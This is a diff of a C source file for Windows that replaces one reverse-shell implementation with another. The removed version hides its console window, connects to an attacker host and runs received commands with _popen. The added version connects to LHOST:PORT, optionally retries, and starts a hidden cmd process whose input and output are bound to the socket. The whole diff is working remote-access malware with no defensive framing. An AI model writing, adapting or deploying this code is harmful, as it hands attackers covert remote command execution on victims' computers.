@@ -1,81 +1,50 @@
+#include <winsock2.h>
+#include <windows.h>
+#include <io.h>
+#include <process.h>
+#include <sys/types.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <unistd.h>
-#include <winsock2.h>
-#include <winuser.h>
-#include <wininet.h>
-#include <windowsx.h>
 #include <string.h>
-#include <sys/stat.h>
-#include <sys/types.h>
 
-#define bzero(p, size) (void)memset((p), 0, (size))
+char* CLIENT_IP = LHOST;
+int CLIENT_PORT = PORT;
 
-int sock;
-char* ServIP = LHOST;
-int ServPort = PORT;
+int main(void) {
 
-void Shell()
-{
-    char buffer[1024];
-    char container[1024];
-    char total_response[18384];
-    while (TRUE)
-    {
-    jump:
-        bzero(buffer, sizeof(buffer));
-        bzero(container, sizeof(container));
-        bzero(total_response, sizeof(total_response));
-        recv(sock, buffer, sizeof(buffer), 0);
+	WSADATA wsaData;
+	if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
+		write(2, "[ERROR] WSASturtup failed.\n", 27);
+		return (1);
+	}
 
-        if (strncmp("q", buffer, 1) == 0)
-        {
-            closesocket(sock);
-            WSACleanup();
-            exit(0);
-        }
-        else
-        {
-            FILE *fp;
-            fp = _popen(buffer, "r");
-            while (fgets(container, 1024, fp) != NULL)
-            {
-                strcat(total_response, container);
-            }
-            send(sock, total_response, sizeof(total_response), 0);
-            fclose(fp);
-        }
-    }
-}
+	int port = CLIENT_PORT;
+	struct sockaddr_in sa;
+	SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+	sa.sin_family = AF_INET;
+	sa.sin_port = htons(port);
+	sa.sin_addr.s_addr = inet_addr(CLIENT_IP);
 
-int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
-{
-    HWND stealth;
-    AllocConsole();
-    stealth = FindWindowA("ConsoleWindowClass", NULL);
-    ShowWindow(stealth, 0);
-    struct sockaddr_in ServAddr;
-    
-    
-    WSADATA wsaData;
-    
-    
-    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)
-    {
-        exit(1);
-    }
+#ifdef WAIT_FOR_CLIENT
+	while (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
+		Sleep(5000);
+	}
+#else
+	if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
+		write(2, "[ERROR] connect failed.\n", 24);
+		return (1);
+	}
+#endif
 
-    sock = socket(AF_INET, SOCK_STREAM, 0);
-    memset(&ServAddr, 0, sizeof(ServAddr));
-    ServAddr.sin_family = AF_INET;
-    ServAddr.sin_addr.s_addr = inet_addr(ServIP);
-    ServAddr.sin_port = htons(ServPort);
+	STARTUPINFO sinfo;
+	memset(&sinfo, 0, sizeof(sinfo));
+	sinfo.cb = sizeof(sinfo);
+	sinfo.dwFlags = (STARTF_USESTDHANDLES);
+	sinfo.hStdInput = (HANDLE)sockt;
+	sinfo.hStdOutput = (HANDLE)sockt;
+	sinfo.hStdError = (HANDLE)sockt;
+	PROCESS_INFORMATION pinfo;
+	CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
 
-start:
-    while (connect(sock, (struct sockaddr *)&ServAddr, sizeof(ServAddr)) != 0)
-    {
-        Sleep(10);
-        goto start;
-    }
-    Shell();
+	return (0);
 }
